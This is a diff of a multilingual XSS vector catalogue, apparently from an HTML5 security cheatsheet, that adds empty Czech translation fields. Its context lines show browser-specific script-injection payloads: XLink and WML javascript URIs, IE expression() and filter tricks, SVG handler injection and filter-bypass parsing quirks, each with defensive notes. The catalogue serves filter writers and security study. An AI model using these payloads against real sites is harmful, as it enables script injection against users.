             'ru' : 'Пассивный скриптинг с помощью XLinks',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">\r\n\t<html:style /><x xlink:href="%js_uri_alert%" xlink:type="simple">XXX</x>\r\n</doc>',
@@ -2092,6 +2294,7 @@ var items =
             'en' : 'Gecko based browsers like Firefox allow using XLinks. Those can be equipped with a JavaScript URI to execute JavaScript in case the user clicks on one of those XLinks.', 
             'ja' : '',
             'ru' : 'В Gecko-браузерах, таких как Firefox, реализована частичная поддержка XLinks. При этом XLink разрешает использовать псевдоскрипт в качестве URL.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/xlink/', 'http://www.w3.org/TR/2010/REC-xlink11-20100506/', '#81', '#87'],
@@ -2099,6 +2302,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2114,6 +2318,7 @@ var items =
             'en' : 'Opera WML JavaScript execution via timer event',
             'ja' : '',
             'ru' : 'Исполнение JavaScript в WML с помощью события timer',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="%js_uri_alert%"/></onevent><timer value="1"/></card>',
@@ -2121,6 +2326,7 @@ var items =
             'en' : 'Opera supports WML files - Wireless Markup Language. As soon as a file has the extension .wml Opera assumes it\'s a WML and renders it accordingly. With a timer event and a connected redirect it\'s possible to execute JavaScript without user interaction.', 
             'ja' : '',
             'ru' : 'Opera реализовала поддержку WML (языка беспроводной разметки) и специальных файлов с расширением .wml, разметка в которых по умолчанию будет рассматриваться как принадлежащая к пространству имен wml. Событие timer в соединении с перенаправлением позволяет достичь исполнения JavaScript без взаимодействия с пользователем.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3schools.com/wap/default.asp', 'http://www.w3schools.com/wmlscript/default.asp','#83'],
@@ -2128,6 +2334,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2143,6 +2350,7 @@ var items =
             'en' : 'JavaScript execution via IE filters and onfilterchange',
             'ja' : '',
             'ru' : 'исполнение JavaScript с использованием IE-фильров и onfilterchange',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<div style=width:1px;filter:glow onfilterchange=%js_alert%>x',
@@ -2150,6 +2358,7 @@ var items =
             'en' : 'In some situations it\'s possible to trigger a filterchange event by using just one filter as the example shows. Also the short filter notation is being used which is supported by all IE versions despite the information in the documentation. In compatibility mode to IE8+ you can use the property "-ms-filter".', 
             'ja' : '',
             'ru' : 'Данный вектор из числа тех, которые позволяют наиболее эффективно использовать возможность изменять разметку внутри уязвимого тега без возможности выйти за его пределы. Вызов события происходит даже при однократном назначении фильтра. Обратите внимание, что синтаксис фильтров может принимать такую сокращенную форму, несмотря на отсутствие упоминания об этом в документации. Универсальность данного способа ограничена только тем, что уязвимый тег должен иметь отображаемое содержимое, к которому применим фильтр. В режиме совместимости с IE8+ вы можете использовать свойство -ms-filter.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/ms532847%28VS.85%29.aspx'],
@@ -2157,6 +2366,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2172,6 +2382,7 @@ var items =
             'en' : 'Closing tags accepting style attributes',
             'ja' : '',
             'ru' : 'Закрывающий тег воспринимает атрибут style',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '</ style=?=-=expression\\28%js_write%\\29>',
@@ -2179,6 +2390,7 @@ var items =
             'en' : 'An unnamed closing tag can still contain style attributes on IE as the example shows. For extra obfuscation a bogus CSS property is being used to execute the JavaScript via expression() combined with CSS escapes.', 
             'ja' : '',
             'ru' : 'В данном примере показано, как тег, имеющий синтаксис закрывающего, принимает стилевой атрибут, в котором дополнительно обфусцировано значение свойства с помощью уже объясненных выше приёмов. JavaScript будет выполнен в Internet Explorer в режиме совместимости только по причине наличия этой обфускации. Сам по себе режим стандартов никак не влияет на возможность распознавания стилевого атрибута в таких тегах. В строгом смысле данные теги нельзя рассматривать в качестве закрывающих. Это особый вид тегов для Internet Explorer, которые данный браузер по тем или иным причинам считает пользовательскими (custom).',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/ms537634%28VS.85%29.aspx', 'http://www.w3.org/TR/CSS2/syndata.html'],
@@ -2186,6 +2398,7 @@ var items =
             'en' : 'Make sure the HTML filter you use deals with unnamed closing tags and doesn\'t consider them to be plain text. Also be aware of CSS escapes and how they can completely obfuscate any style info inside <STYLE> tags and "style" attributes.',
             'ja' : '',
             'ru' : 'Убедитесь, что ваш HTML-фильтр, анализирует в том числе закрывающие теги.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2201,6 +2414,7 @@ var items =
             'en' : 'XSS via formaction - requiring user interaction (2)',
             'ja' : '',
             'ru' : 'XSS через formaction - требуется взаимодействие с пользователем (2)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<form><button formaction="%js_uri_alert%">X',
@@ -2208,6 +2422,7 @@ var items =
             'en' : 'A vector displaying the HTML5 "formaction" capabilities for form hijacking. Note that this variation does not use the "id" and "form" attributes to connect button and form.',
             'ja' : '',
             'ru' : 'Вектор ещё раз демонстрирует возможности HTML5-атрибута formaction по захвату формы. Поскольку тег <INPUT> находится внутри формы, атрибуты id и form не требуются.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#attr-fs-formaction'],
@@ -2215,6 +2430,7 @@ var items =
             'en' : 'Don\'t allow users to submit markup containing "form" and "formaction" attributes or transform them to bogus attributes.',
             'ja' : '',
             'ru' : 'Не разрешайте пользовательскую разметку, содержащую атрибуты form и formaction или неправильные значения этих атрибутов.',
+            'cs' : '',
             'de' : ''
         },
         'browsers'   : {
@@ -2231,6 +2447,7 @@ var items =
             'en' : 'Server-sent events - Opera and <EVENT-SOURCE> tags (1)',
             'ja' : '',
             'ru' : 'События с сервера в Opera и тег <EVENT-SOURCE> (1)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<event-source src="%event_path%" onload="%js_alert%">',
@@ -2245,6 +2462,7 @@ var items =
             'en' : 'Opera allows using <EVENT-SOURCE> elements. In case the "src" attribute points to a valid cross domain source it\'s possible to have the element listen for events and the containing data.',
             'ja' : '',
             'ru' : 'Opera поддерживает тег <EVENT-SOURCE>. Если src атрибут указывает на правильный междоменный источник, становится возможным послать в тег событие и содержащиеся в ответе сервера данные.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://hixie.ch/specs/html/server-sent-events/server-sent-events'],
@@ -2252,6 +2470,7 @@ var items =
             'en' : 'Make sure users cannot influence the source of <EVENT-SOURCE> elements and don\'t whitelist the tag itself inside user submitted markup.',
             'ja' : '',
             'ru' : 'Убедитесь, что пользовательский ввод не может содержать тег <EVENT-SOURCE>.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2267,6 +2486,7 @@ var items =
             'en' : 'Server-sent events - Opera and <EVENT-SOURCE> tags (2)',
             'ja' : '',
             'ru' : 'События с сервера в Opera и тег <EVENT-SOURCE> (2)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<a href="%js_uri_alert%"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">',
@@ -2274,6 +2494,7 @@ var items =
             'en' : 'Opera allows using <EVENT-SOURCE> tags to receive server-sent events. In this example a data URI is being used as an event source triggering a click on another HTML element. In an attack scenario an XSS requiring user interaction can be turned into an active script execution this way.',
             'ja' : '',
             'ru' : 'В примере показан способ послать в тег ссылки событие click с помощью тега <EVENT-SOURCE> и таким образом выполнить JavaScript без взаимодействия с пользователем. В случае необходимости послать событие в какой-либо внешний тег на странице, событие с сервера должно содержать поле Target со значением идентификатора тега (см. приведенную документацию).',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://hixie.ch/specs/html/server-sent-events/server-sent-events'],
@@ -2281,6 +2502,7 @@ var items =
             'en' : 'Make sure users cannot influence the source of <EVENT-SOURCE> elements and don\'t whitelist the tag itself inside user submitted markup.',
             'ja' : '',
             'ru' : 'Убедитесь, что пользовательский ввод не может содержать тег <EVENT-SOURCE>.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2296,6 +2518,7 @@ var items =
             'en' : 'E4X used to close an opening <SCRIPT> tag and {} evaluation',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<script<{alert(1)}/></script </>',
@@ -2303,6 +2526,7 @@ var items =
             'en' : 'In this example an E4X object is being used to close a half-open <SCRIPT> tag and evaluate code in the global scope afterwards via the E4X curly bracket delimiters. This technique will not work anymore as soon Firefox uses the already integrated HTML5 parser (html5.enable=true)',
             'ja' : '',
             'ru' : 'В данном примере E4X-объект использован для закрытия дескриптора и в то же время для выполнения кода, содержащегося внутри специфических E4X-ограничителей {}. Такая техника не сработает, как только Firefox будет использовать уже интегрированный в него HTML5-парсер (html5.enable=true).',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['https://developer.mozilla.org/en/E4X', 'https://bugzilla.mozilla.org/show_bug.cgi?id=564706'],
@@ -2310,6 +2534,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2325,6 +2550,7 @@ var items =
             'en' : 'Arbitrary payload injection via XML external DTD in IE',
             'ja' : '',
             'ru' : 'Инъекция удаленного javascript-кода через внешнее определение типа документа (DTD)',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>',
@@ -2339,6 +2565,7 @@ var items =
             'en' : 'IE requires to display html-tags of any users stylesheet and namespace prefix "html".',
             'ja' : '',
             'ru' : 'IE для отображения HTML-тегов требует обязательного наличия на xml-странице пользовательской таблицы стилей, а также объявления соответствующего пространства имен с префиксом "html".',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['#64', '#67'],
@@ -2346,6 +2573,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2361,6 +2589,7 @@ var items =
             'en' : 'XML JavaScript execution via style attribute in IE',
             'ja' : '',
             'ru' : 'Выполнение javascript c помощью стилевого атрибута в IE на XML-странице',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<?xml-stylesheet type="text/css"?><root style="x:expression(%js_write%)"/>',
@@ -2368,6 +2597,7 @@ var items =
             'en' : 'IE supports the style attribute to the xml-pages. So JavaScript can be executed in any tag.',
             'ja' : '',
             'ru' : 'IE поддерживает стилевой атрибут на xml-страницах. Таким образом javascript может быть выполнен в любом теге.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -2375,6 +2605,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2390,6 +2621,7 @@ var items =
             'en' : 'Arbitrary payload injection via XSL + XDR-schema in IE',
             'ja' : '',
             'ru' : 'Инъекция удаленного javascript-кода в IE с помощью XSL и XDR-схемы',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:%xdr_path%"/>',
@@ -2404,6 +2636,7 @@ var items =
             'en' : 'The namespace "html" is automatically determined using XSL. Missing attributes for the <img> tag is obtained from the XDR-schema.',
             'ja' : '',
             'ru' : 'Пространство имен html автоматически определяется IE с помощью XSL-таблицы. Недостающие атрибуты для тега <img> заимствуются из XDR-схемы.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://msdn.microsoft.com/en-us/library/ms256208(v=VS.100).aspx'],
@@ -2411,6 +2644,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2426,6 +2660,7 @@ var items =
             'en' : '<OBJECT> tag and Flash files executing JavaScript',
             'ja' : '',
             'ru' : 'Использование тега <OBJECT> и Flash для исполнения JavaScript',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<object data="%swf_path%"></object>',
@@ -2433,6 +2668,7 @@ var items =
             'en' : '<OBJECT> tags directly including Flash files via the "data" attribute - allowing execution of JavaScript and more without user interaction.',
             'ja' : '',
             'ru' : 'Тег <OBJECT> с помощью атрибута data вставляет на страницу флеш-файл, который вызывает JavaScript, делая запрос с псевдоскриптом в качестве URL.',
+            'cs' : '',
             'de' : ''
         },
         'attachment' : {
@@ -2447,6 +2683,7 @@ var items =
             'en' : 'Make sure users cannot control the "src" and "data" attribute values of <OBJECT> tags - or better don\'t whitelist <OBJECT> tags in user submitted markup at all.',
             'ja' : '',
             'ru' : 'Убедитесь, что пользователи не могут контролировать атрибуты src и data тега <OBJECT>, или лучше - не заносите тег <OBJECT> в белый лист пользовательской разметки.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2465,6 +2702,7 @@ var items =
             'en' : 'IE6 and halfwidth/fullwidth Unicode characters',
             'ja' : '',
             'ru' : 'IE6 и юникодовые символы половинной и полной ширины',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(write(1))}</style>',
@@ -2472,6 +2710,7 @@ var items =
             'en' : 'This example shows how halfwidth/fullwidth Unicode characters can be used on IE6 to substitute characters from the ASCII range. Note that those characters have been used in the example to create the term "expression".',
             'ja' : '',
             'ru' : 'Пример демонстрирует возможность подмены ASCII символов юникодовыми символами половинной и полной ширины при формировании последовательности "expression" в Internet Explorer 6. Естественно, это не единственное место, где можно использовать такие символы.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_Unicode_block'],
@@ -2479,6 +2718,7 @@ var items =
             'en' : 'In case your website still has a lot of IE6 users make sure that the range of halfwidth and fullwidth form characters (U+FF00-FFEF) cannot be used in user submitted markup and styles.',
             'ja' : '',
             'ru' : 'В случае, если ваш сайт посещают счастливые обладатели IE6, убедитесь, что символы половинной и полной ширины (U+FF00-FFEF) не допускаются в пользовательской разметке и стилях.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2494,6 +2734,7 @@ var items =
             'en' : 'Active JavaScript execution via XLinks',
             'ja' : '',
             'ru' : 'Активный скриптинг с помощью XLinks',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="%js_uri_alert%" xlink:type="simple"/>',
@@ -2501,6 +2742,7 @@ var items =
             'en' : 'FF support the attribute "xlink:actuate" and can display xlink without additional styles and namespaces "html".',
             'ja' : '',
             'ru' : 'FF поддерживает атрибут xlink:actuate и может отобразить xml-ссылку без дополнительных стилей и пространства имен html.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/xlink/#actuate-att', 'http://www.w3.org/TR/2010/REC-xlink11-20100506/', '#68', '#87'],
@@ -2508,6 +2750,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2523,6 +2766,7 @@ var items =
             'en' : 'JavaScript execution via XML stylesheet, data URI and expression()',
             'ja' : '',
             'ru' : 'Исполнение JavaScript с помощью stylesheet, data URI и expression()',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>',
@@ -2530,6 +2774,7 @@ var items =
             'en' : 'Internet Explorer 8 and 9 support data URIs and thus are capable of including stylesheets this way. By using a xml stylesheet tag and a data URI containing an expression() it\'s possible to execute JavaScript without user interaction.',
             'ja' : '',
             'ru' : 'В примере еще раз показана возможность Internet Explorer 8 и 9 использовать data-схему для хранения небезопасной стилевой информации в XML.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/xml-stylesheet/'],
@@ -2537,6 +2782,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2552,6 +2798,7 @@ var items =
             'en' : 'Obfuscation unsafe parameter via wml-variables.',
             'ja' : '',
             'ru' : 'Обфускация опасного параметра с использованием wml-переменных',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:%js_alert%"><x:timer value="1"/></x:template>',
@@ -2559,6 +2806,7 @@ var items =
             'en' : 'The example demonstrates the use in WML undeclared variables (are ignored). These variables can be declared in the tags <setvar>, <input>, <select>. Namespace indicated for use inside the XML-file. Also inside WML-files can you use a lot of regular HTML-tags.', 
             'ja' : '',
             'ru' : 'Пример демонстрирует использование в WML необъявленных переменных, которые будут игнорироваться. Эти переменные можно объявить в тегах <setvar>, <input>, <select>. Пространство имен указано для использования в XML-файле. Не забывайте, что внутри WML-файлов вы можете использовать множество обычных HTML-тегов. ',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3schools.com/wap/wml_variables.asp','#69'],
@@ -2566,6 +2814,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2581,6 +2830,7 @@ var items =
             'en' : 'Opera JavaScript execution via XML-events handler',
             'ja' : '',
             'ru' : 'Выполнение javascript в Opera c помощью обработчика XML-события',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="%js_uri_alert%//#x"/>',
@@ -2588,6 +2838,7 @@ var items =
             'en' : 'The browser tries to load an external XML-event handler and executed javascript without user interaction.', 
             'ja' : '',
             'ru' : 'Браузер пытается загрузить внешний обработчик XML-события и выполняет javascript.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/xml-events/', '#94', '#104'],
@@ -2595,6 +2846,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2610,6 +2862,7 @@ var items =
             'en' : 'Arbitrary payload injection in Opera via XML-events handler',
             'ja' : '',
             'ru' : 'Инъекция удаленного javascript-кода в Opera c помощью обработчика XML-события',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>',
@@ -2624,6 +2877,7 @@ var items =
             'en' : 'The browser loads an external xml-event handler, which contains the javascript-code. This example also works with data URI.', 
             'ja' : '',
             'ru' : 'Браузер загружает внешний обработчик XML-события, который содержит javascript код. Этот пример также будет работать с data-схемой.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/xml-events/', '#94', '#104'],
@@ -2631,6 +2885,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2646,6 +2901,7 @@ var items =
             'en' : 'Passive JavaScript execution via <BODY> and oninput attribute',
             'ja' : '',
             'ru' : 'Пассивный скриптинг с помощью <BODY> и атрибута oninput',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<body oninput=%js_alert%><input autofocus>',
@@ -2653,6 +2909,7 @@ var items =
             'en' : 'All browsers besides Internet Explorer support the "oninput" event handler around form elements like the given <INPUT>. The event works for the form elements itself, the surrounding form and <BODY> as well as <HTML> tags.', 
             'ja' : '',
             'ru' : 'Все браузеры за исключением Internet Explorer поддерживают обработчик oninput, который может быть внедрен в любой тег, обрамляющий любую область пользовательского ввода (не только в тегах форм, но и в тегах с атрибутом contenteditable).',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -2660,6 +2917,7 @@ var items =
             'en' : 'Do not whitelist "oninput" attributes in user submitted markup.',
             'ja' : '',
             'ru' : 'Убедитесь, что правила вашего фильтра учитывают появление в HTML5 новых обработчиков событий.',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2678,6 +2936,7 @@ var items =
             'en' : 'SVG simple passive JavaScript execution via XLink',
             'ja' : '',
             'ru' : 'Пассивный скриптинг в SVG c помощью XLink',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="%js_uri_alert%"><rect width="1000" height="1000" fill="white"/></a>\n</svg>',        
@@ -2685,6 +2944,7 @@ var items =
             'en' : 'Browsers that support SVG, forced to support XLink. The parameter of the attribute "xlink:actuate" for <a> tag is fixed - "onRequest".',
             'ja' : '',
             'ru' : 'Браузеры, которые поддерживают SVG, вынуждены поддерживать и XLink, поскольку таким образом реализуются почти все связи. Параметр атрибута xlink:actuate тега <a> является фиксированным - onRequest.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/SVG11/linking.html', 'http://www.w3.org/TR/SVGTiny12/linking.html'],
@@ -2692,6 +2952,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         }, 
         'browsers'   : {
@@ -2710,6 +2971,7 @@ var items =
             'en' : 'SVG active JavaScript execution via XLink in Opera',
             'ja' : '',
             'ru' : 'Активный скриптинг в SVG с помощью XLink для Opera',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<animation xlink:href="%js_uri_alert%"/>\n<animation xlink:href="data:text/xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'%js_alert%\'%3E%3C/svg%3E"/>\n<image xlink:href="data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'%js_alert%\'%3E%3C/svg%3E"/>\n<foreignObject xlink:href="%js_uri_alert%"/>\n<foreignObject xlink:href="data:text/xml,%3Cscript xmlns=\'http://www.w3.org/1999/xhtml\'%3E%js_alert%%3C/script%3E"/>\n</svg>',        
@@ -2717,6 +2979,7 @@ var items =
             'en' : 'The content of the xml-links will automatically be included in the current document. The combination of "onLoad" (value of xlink:actuate) and "embed" (value of xlink:show) forms of potentially unsafe SVG-elements.',
             'ja' : '',
             'ru' : 'Содержимое xml-ссылки автоматически включается в текущий документ. Сочетание предустановленных параметров onLoad атрибута xlink:actuate и embed атрибута xlink:show образует потенциально небезопасные SVG-элементы.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/SVG11/attindex.html', 'http://www.w3.org/TR/SVGTiny12/attributeTable.html'],
@@ -2724,6 +2987,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2739,6 +3003,7 @@ var items =
             'en' : 'SVG event handler injection via "set" and "animate"',
             'ja' : '',
             'ru' : 'Инъекция обработчика события в SVG с помощью анимирования',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<set attributeName="onmouseover" to="%js_alert%"/>\n<animate attributeName="onunload" to="%js_alert%"/>\n</svg>',        
@@ -2746,6 +3011,7 @@ var items =
             'en' : 'Google Chrome and Safari support binding an event handler using the elements <set> or <animate>. The attribute value is the actually bound event while the "to" attribute value holds the payload.',
             'ja' : '',
             'ru' : 'Google Chrome и Safari поддерживают привязку обработчика события с использованием элементов <set> или <animate>.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : ['http://www.w3.org/TR/SVG11/animate.html', 'http://www.w3.org/TR/SVGMobile12/animate.html', '#24', '#28'],
@@ -2753,6 +3019,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2769,6 +3036,7 @@ var items =
             'en' : 'SVG images containing XML data - with disabled JavaScript',
             'ja' : '',
             'ru' : 'SVG-изображение это такой же XML-документ, но с выключенным javascript',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<div style=content:url(%svg_path_2%)></div>',
@@ -2783,6 +3051,7 @@ var items =
             'en' : 'Opera supports the CSS property "content" for style attributes. The SVG image can contain SVG as well as HTML code. The example shows how a <FORM> tag can be used to trick the user into clicking a button and thus executing JavaScript. The same works for SVG files embedded via <IMG> tags.',
             'ja' : '',
             'ru' : 'Opera поддерживает CSS-свойство content в стилевом атрибуте. В качестве его значения может быть указан объект, который заместит html-тег. Такой же эффект (а именно вставка ифрейма на страницу) происходит при вставке SVG-изображения через тег <IMG>.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -2790,6 +3059,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2805,6 +3075,7 @@ var items =
             'en' : 'Special tags parsing issues',
             'ja' : '',
             'ru' : 'Особенности разбора спецтегов',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '[A]\n<? foo="><script>%js_alert%</script>">\n<! foo="><script>%js_alert%</script>">\n</ foo="><script>%js_alert%</script>">\n[B]\n<? foo="><x foo=\'?><script>%js_alert%</script>\'>">\n[C]\n<! foo="[[[Inception]]"><x foo="]foo><script>%js_alert%</script>">\n[D]\n<% foo><x foo="%><script>%js_alert%</script>">',        
@@ -2812,6 +3083,7 @@ var items =
             'en' : 'The HTML tagnames start with a-zA-Z (abstracting from fuzzing). In addition, there are other structures, parsed as a tag (special tags). They begin with the following characters: !,?, /,%. This has its reasons:  DTD, comments, xml-declaration, import-instruction in Internet Explorer, closing tags etc. starts by these characters. These examples show that such tags will inherit some properties of their standard models.\n\n[A] Firefox, Opera, Google Chrome: Parameters of the special tags can not contain a closing parenthesis ">".\n\n[B] Safari: Parameter of the special tags can be broken only via "?>".\n\n[C] Opera: Special tag inherits the properties of DTD: inside it you can create a section that starts with "[" and ends with "]".\n\n[D] Internet Explorer, Safari: A sequence like "<% ... %>" is an alternative to comments.\n\nThese features can be used for obfuscation and bypassing filters. And remember, do not parse as a tag in HTML structure like "<È foo=...>".',
             'ja' : '',
             'ru' : 'В HTML имена тегов начинаются с a-zA-Z (если при этом абстрагироваться от возможного напыления). Помимо этого существуют другие конструкции, распознающиеся в качестве тегов (спецтеги). Они начинаются со следующих символов : !, ?, /, % . Этому есть очевидные причины : с этих символов начинаются DTD, комментарии, xml-декларации, инструкции импорта в Internet Explorer, закрывающие теги и т.д. В приведенных ниже примерах мы видим, что спецтеги, несмотря на явные синтаксические отличия от своих стандартных моделей, сохраняют некоторые их свойства.\n\n[A] Firefox, Opera, Google Chrome: Параметр специального тега не может содержать закрывающую скобку (>).\n\n[B] Safari: Параметр может быть прерван только последовательностью ?> .\n\n[C] Opera: Спецтег унаследовал свойсвтво DTD: внутри него можно открыть особую секцию, начинающуюся с [ и оканчивающуюся на ].\n\n[D] Internet Explorer, Safari: Последовательность <% ... %> может быть использована в качестве альтернативы комментариям.\n\nЭти особенности могут быть использованы для обфускации и обхода фильтров. И помните: не следует воспринимать в качестве тегов конструкции, ими в HTML не являющиеся (наподобие <фуфел foo=...>).',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -2819,6 +3091,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2838,6 +3111,7 @@ var items =
             'en' : 'Breaking the functional notation on IE ',
             'ja' : '',
             'ru' : 'Способ разорвать функциональную нотацию в IE',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<!DOCTYPE>\n<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X',        
@@ -2845,6 +3119,7 @@ var items =
             'en' : 'To break the functional notation on IE "url()" can be used combined with a following whitespace - then followed by any non-whitespace character.',
             'ja' : '',
             'ru' : 'В качестве прерывателя функциональной нотации "url()" может быть использована комбинация из любого пробельного символа, за которым следует любой непробельный символ.',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -2852,6 +3127,7 @@ var items =
             'en' : '',
             'ja' : '',
             'ru' : '',
+            'cs' : '',
             'de' : ''
         },                        
         'browsers'   : {
@@ -2867,6 +3143,7 @@ var items =
             'en' : 'Multiple CSS "url()" values in IE 6',
             'ja' : '',
             'ru' : 'Множественный "url()" в IE 6',
+            'cs' : '',
             'de' : ''
         },
         'data'       : '<div style="list-style:url(http://foo.f)\\20url(%js_uri_alert%);">X',        
@@ -2874,6 +3151,7 @@ var items =
             'en' : 'Internet Explorer supports multiple "url()" values all of which can contain payload. The delimiter between the "url()" values should be a whitespace character ("\\x20" in the given example).',
             'ja' : '',
             'ru' : 'IE поддерживает множественный "url()", который может содержать "полезную нагрузку". Разделителем "url()" должен быть любой пробельный символ (\\x20 в приведенном примере).',
+            'cs' : '',
             'de' : ''
         },
         'urls'    : [],
@@ -2881,6 +3159,7 @@ var items =
             'en' : 'Make sure in case the user is allowed to submit CSS it is being filtered and whitelisted correctly to avoid attacks via multiple backgrounds.',
             'ja' : '',
